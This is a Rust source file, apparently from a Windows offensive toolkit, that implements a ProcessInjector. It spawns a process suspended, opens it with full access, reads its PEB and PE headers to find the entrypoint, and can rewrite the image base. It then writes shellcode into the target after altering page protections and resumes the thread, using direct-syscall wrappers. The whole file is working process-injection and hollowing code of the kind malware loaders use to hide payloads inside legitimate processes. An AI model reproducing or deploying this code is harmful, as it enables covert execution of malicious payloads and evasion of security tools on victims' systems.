use core::{mem, ptr::{self, null_mut}};
use alloc::vec::Vec;
use ntapi::{ntioapi::{FILE_BASIC_INFORMATION, FILE_NON_DIRECTORY_FILE, FILE_STANDARD_INFORMATION, FILE_SYNCHRONOUS_IO_NONALERT, FileBasicInformation, FileDispositionInformation, FileStandardInformation, IO_STATUS_BLOCK}, ntmmapi::{NtAllocateVirtualMemory, NtReadVirtualMemory, NtWriteVirtualMemory}, ntobapi::NtClose, ntpebteb::{PEB, PPEB}, ntpsapi::{NtCurrentProcess, NtResumeThread}};
use winapi::{ctypes::c_void, shared::{minwindef::BOOL, ntdef::{HANDLE, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJECT_ATTRIBUTES, UNICODE_STRING}}, um::{errhandlingapi::GetLastError, fileapi::{FILE_DISPOSITION_INFO, SetFileInformationByHandle}, minwinbase::FileDispositionInfo, winnt::{DELETE, FILE_ATTRIBUTE_READONLY, FILE_READ_DATA, FILE_SHARE_DELETE, FILE_SHARE_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, SYNCHRONIZE}}};
use toolkit::{syscalls::{NtOpenFile, NtQueryInformationFile, NtSetInformationFile}, *};

use crate::shellcode::Shellcode;

const INFINITE: u32 = 0xFFFFFFFF;

pub struct ProcessInjector {
    info: ProcessInfo,
    suspended: bool,
    peb_base: PPEB,
}

impl ProcessInjector {
    pub fn new_suspended<const N: usize>(path: U16CStackString<N>) -> Result<Self, NTSTATUS> {
        let mut info = ProcessSpawner::create_suspended(path)?;
        let full_handle = ProcessOpener::open_full_access(info.pid)?;
        let peb_base = ProcessQuerier::query_peb(full_handle)?;

        unsafe {
            if !info.handle.is_null() {
                NtClose(info.handle);
            }
            info.handle = full_handle;
        }

        Ok(ProcessInjector {
            info,
            suspended: true,
            peb_base
        })
    }

    pub fn entrypoint(&self) -> Result<*mut winapi::ctypes::c_void, NTSTATUS> {
        let peb: PEB = ProcessMemoryReader::read_remote(self.info.handle, self.peb_base as *mut c_void)?;
        let image_base = peb.ImageBaseAddress as usize;

        let dos_header: IMAGE_DOS_HEADER = ProcessMemoryReader::read_remote(self.info.handle, image_base as *mut c_void)?;

        let nt_headers_addr = image_base + dos_header.e_lfanew as usize;
        let nt_headers: IMAGE_NT_HEADERS64 = ProcessMemoryReader::read_remote(self.info.handle, nt_headers_addr as *mut c_void)?;

        let entrypoint_rva = nt_headers.OptionalHeader.AddressOfEntryPoint;
        Ok((image_base + entrypoint_rva as usize) as *mut _)
    }

    pub fn set_imagebase(&self, addr: *mut c_void) -> Result<(), NTSTATUS> {
        let mut peb: PEB = ProcessMemoryReader::read_remote(self.info.handle, self.peb_base as *mut c_void)?;
        peb.ImageBaseAddress = addr;
        ProcessMemoryWriter::write_struct_remote(self.info.handle, self.peb_base as *mut c_void, &peb)?;
        
        Ok(())
    }

    pub fn allocate_object_attributes(&self, slice: &[u16]) -> Result<*mut c_void, NTSTATUS> {
        let oa_size = mem::size_of::<OBJECT_ATTRIBUTES>();
        let us_size = mem::size_of::<UNICODE_STRING>();
        let string_bytes = slice.len() * 2;
        let total_size = oa_size + us_size + string_bytes;
        
        let base_addr = ProcessMemoryAlloc::allocate(self.info.handle, total_size)?;
        
        let us_addr = (base_addr as usize) + oa_size;
        let string_addr = us_addr + us_size;
        
        let mut remote_unicode = UNICODE_STRING {
            Length: string_bytes as u16,
            MaximumLength: (string_bytes + 2) as u16,
            Buffer: string_addr as *mut u16,
        };
        
        let object_attributes = OBJECT_ATTRIBUTES {
            Length: oa_size as u32,
            RootDirectory: ptr::null_mut(),
            ObjectName: us_addr as *mut UNICODE_STRING,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };
        
        let mut buffer = Vec::with_capacity(total_size);
        
        let oa_bytes = unsafe {
            core::slice::from_raw_parts(
                &object_attributes as *const _ as *const u8,
                oa_size
            )
        };
        buffer.extend_from_slice(oa_bytes);
        
        let us_bytes = unsafe {
            core::slice::from_raw_parts(
                &remote_unicode as *const _ as *const u8,
                us_size
            )
        };
        buffer.extend_from_slice(us_bytes);
        
        let string_bytes_slice = unsafe {
            core::slice::from_raw_parts(
                slice.as_ptr() as *const u8,
                string_bytes
            )
        };
        buffer.extend_from_slice(string_bytes_slice);
        
        let mut bytes_written = 0;
        let status = unsafe {
            NtWriteVirtualMemory(
                self.info.handle,
                base_addr as *mut _,
                buffer.as_ptr() as *mut _,
                buffer.len(),
                &mut bytes_written,
            )
        };
        
        if status < 0 {
            return Err(status);
        }
        
        Ok(base_addr)
    }

    pub fn allocate_unicode(&self, unicode: UNICODE_STRING) -> Result<*mut c_void, NTSTATUS> {
        let total_size = mem::size_of::<UNICODE_STRING>() + unicode.Length as usize;
        let addr = ProcessMemoryAlloc::allocate(self.info.handle, total_size)?;
        
        let mut remote_unicode = unicode;
        remote_unicode.Buffer = ((addr as usize) + mem::size_of::<UNICODE_STRING>()) as *mut u16;
        
        let mut buffer = alloc::vec::Vec::with_capacity(total_size);
        let struct_ptr = &remote_unicode as *const _ as *const u8;
        let struct_bytes = unsafe {
            core::slice::from_raw_parts(struct_ptr, mem::size_of::<UNICODE_STRING>())
        };
        buffer.extend_from_slice(struct_bytes);
        
        let string_bytes = unsafe {
            core::slice::from_raw_parts(unicode.Buffer as *const u8, unicode.Length as usize)
        };
        buffer.extend_from_slice(string_bytes);
        
        unsafe {
            let mut bytes_written = 0;
            let status = NtWriteVirtualMemory(
                self.info.handle,
                addr as *mut _,
                buffer.as_mut_ptr() as *mut _,
                buffer.len(),
                &mut bytes_written,
            );
            
            if status < 0 {
                return Err(status);
            }
        }
        
        Ok(addr)
    }

    pub fn allocate_with_data(&self, data: &[u8]) -> Result<*mut c_void, NTSTATUS> {
        let result = ProcessMemoryAlloc::allocate_and_write_bytes(self.info.handle, data)?;

        
        Ok(result)
    }

    pub fn inject_at<const N: usize>(&mut self, addr: *mut c_void, mut shellcode: Shellcode<N>) -> Result<(), NTSTATUS> {
        if !self.suspended {
            return Err(1);
        }

        let mut bytes = shellcode.into_inner();

        let protector = ProcessMemoryProtector::remote(self.handle());
        let session = protector.make_writable(addr, bytes.len())?;

        ProcessMemoryWriter::write_remote(self.handle(), addr as _, &mut bytes)?;

        session.restore()?;

        Ok(())
    }

    pub fn resume(&mut self) -> Result<(), NTSTATUS> {
        if !self.suspended {
            return Ok(());
        }

        let status = unsafe { NtResumeThread(self.info.thread, ptr::null_mut()) };
        
        if status != 0 {
            return Err(status);
        }

        self.suspended = false;
        Ok(())
    }

    pub fn pid(&self) -> u32 {
        self.info.pid
    }

    pub fn tid(&self) -> u32 {
        self.info.tid
    }

    pub fn handle(&self) -> *mut winapi::ctypes::c_void {
        self.info.handle
    }
}

impl Drop for ProcessInjector {
    fn drop(&mut self) {
        
        if !self.info.thread.is_null() {
            unsafe {
                let status = NtClose(self.info.thread);
                if status < 0 {
                }
                self.info.thread = ptr::null_mut();
            }
        }

        if !self.info.handle.is_null() {
            unsafe {
                let status = NtClose(self.info.handle);
                if status < 0 {
                }
                self.info.handle = ptr::null_mut();
            }
        }
        
        self.suspended = false;
        self.peb_base = ptr::null_mut();
    }
}